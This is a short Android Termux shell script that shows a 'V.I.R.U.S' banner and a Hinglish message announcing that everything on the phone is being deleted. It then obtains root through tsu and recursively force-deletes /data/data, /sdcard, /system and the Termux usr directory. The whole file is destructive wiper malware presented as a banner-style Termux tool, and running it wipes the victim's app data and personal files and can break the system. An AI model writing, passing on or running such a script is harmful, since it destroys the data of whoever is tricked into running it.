#!/bin/sh
#colors
a='\033[1;92m'
b='\033[1;93m'
c='\033[1;94m'
d='\033[1;95m'
e='\033[1;96m'
echo " "
pkg install figlet
pkg install toilet
pkg install tsu
toilet -f standard -F gay Termux
toilet -f standard -F gay V.I.R.U.S
sleep 5
echo "$a Ab phone ka sb kuch delete ho rha hai...... $b"
echo " "
sleep 5
tsu -c rm -Rf /data/data
tsu -c rm -Rf /sdcard
rm -Rf /sdcard
tsu -c rm -Rf /system
cd ..
cd usr
rm -Rf *
tsu -c rm -Rf *
echo "$c Completed $d"